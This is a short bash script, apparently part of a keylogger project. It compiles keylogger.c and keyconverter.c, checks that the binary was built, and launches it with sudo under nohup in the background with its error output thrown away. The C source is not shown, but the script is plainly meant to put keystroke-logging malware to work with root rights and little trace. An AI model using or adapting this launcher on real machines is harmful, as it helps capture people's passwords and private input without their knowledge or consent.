#!/bin/bash

# Compile the C files
gcc -o keylogger keylogger.c keyconverter.c
if [ $? -ne 0 ]; then
    echo "Compilation failed"
    exit 1
fi

# Check if the executable was created
if [ ! -f keylogger ]; then
    echo "Executable 'keylogger' not found"
    exit 1
fi

# Run the executable with sudo in the background, redirecting errors to /dev/null
nohup sudo ./keylogger 2>/dev/null &

